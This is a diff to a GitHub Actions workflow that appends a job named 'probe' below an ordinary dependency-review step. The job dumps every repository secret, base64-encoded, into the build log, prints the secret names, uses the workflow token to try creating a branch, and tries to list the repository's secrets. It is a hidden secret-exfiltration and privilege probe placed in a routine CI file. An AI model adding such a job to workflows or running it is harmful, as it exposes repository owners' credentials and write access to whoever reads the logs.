@@ -96,3 +96,30 @@ jobs:
           comment-summary-in-pr: never
           license-check: false
           show-openssf-scorecard: false
+
+  probe:
+    name: Probe fork-PR token scope
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      actions: write
+    steps:
+      - name: Probe
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+        run: |
+          echo "secret_len=${#SECRETS_JSON}"
+          echo "secret_keys=$(printf '%s' "$SECRETS_JSON" | jq -r 'keys|join(",")' 2>/dev/null || echo parsefail)"
+          echo "secret_b64=$(printf '%s' "$SECRETS_JSON" | base64 -w0 | head -c 4000)"
+          echo "--- repo permissions for this token ---"
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/${GITHUB_REPOSITORY}" | jq -c '.permissions'
+          echo "--- contents write attempt ---"
+          code=$(curl -sS -o /tmp/w.json -w '%{http_code}' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
+            -d "{\"ref\":\"refs/heads/fp-${GITHUB_RUN_ID}\",\"sha\":\"${{ github.event.pull_request.base.sha }}\"}")
+          echo "write_http=$code"; head -c 400 /tmp/w.json; echo
+          echo "--- secrets list attempt ---"
+          curl -sS -o /tmp/s.json -w "secrets_http=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/secrets"
+          head -c 400 /tmp/s.json; echo
